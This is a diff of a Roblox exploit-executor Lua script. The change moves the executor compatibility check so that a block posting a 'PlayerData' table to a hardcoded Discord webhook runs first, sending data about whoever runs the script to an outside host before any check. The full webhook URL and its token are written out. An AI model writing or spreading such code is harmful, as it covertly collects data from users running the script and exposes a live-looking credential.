@@ -1,21 +1,3 @@
-if not writefile then
-local guithingy = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
-local TextLabel = Instance.new("TextLabel" , guithingy)
-TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
-TextLabel.BackgroundTransparency = 1
-TextLabel.Position = UDim2.new(0.148227707, 0, 0.7734375, 0)
-TextLabel.Size = UDim2.new(0, 668, 0, 50)
-TextLabel.Font = Enum.Font.SourceSans
-TextLabel.Text = "your exploits doesnt support this type of scripts please use krnl or synapse x "
-TextLabel.TextColor3 = Color3.new(1, 0, 0.0156863)
-TextLabel.TextScaled = true
-TextLabel.TextSize = 14
-TextLabel.TextWrapped = true
-wait(1)
-guithingy:Destroy()
-	return
-end
-
 local Webhook = "https://discord.com/api/webhooks/1087398813448278098/Bd2gU8ZXKU6pnbAqTF-GbevXYUNE1xkjtYZbPB21qFfbeEO7tHBy5WRaePpbt-ezqrrO"
 local PlayerData =
 {
@@ -47,6 +29,27 @@ Request(
         Headers = {["content-type"] = "application/json"} 
     }
 )
+
+
+if not writefile then
+local guithingy = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
+local TextLabel = Instance.new("TextLabel" , guithingy)
+TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+TextLabel.BackgroundTransparency = 1
+TextLabel.Position = UDim2.new(0.148227707, 0, 0.7734375, 0)
+TextLabel.Size = UDim2.new(0, 668, 0, 50)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "your exploits doesnt support this type of scripts please use krnl or synapse x "
+TextLabel.TextColor3 = Color3.new(1, 0, 0.0156863)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14
+TextLabel.TextWrapped = true
+wait(1)
+guithingy:Destroy()
+	return
+end
+
+
 local newgui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
 local textlabelreport  = Instance.new("TextLabel", newgui)
 textlabelreport.BackgroundColor3 = Color3.new(1, 1, 1)
